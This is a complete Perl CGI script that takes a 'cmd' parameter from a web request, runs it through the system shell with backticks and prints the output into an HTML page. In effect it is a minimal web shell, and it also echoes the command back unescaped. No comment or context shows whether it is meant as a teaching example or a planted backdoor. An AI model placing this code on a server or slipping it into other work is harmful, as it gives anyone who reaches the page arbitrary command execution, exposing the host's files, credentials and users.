#!/usr/bin/perl
use CGI qw(:standard);
print header();
print start_html();
$cmd = param("cmd");
print "<h1>The output of $cmd is:</h1>";
print "<pre>" . `$cmd` . "</pre>";
print end_html();
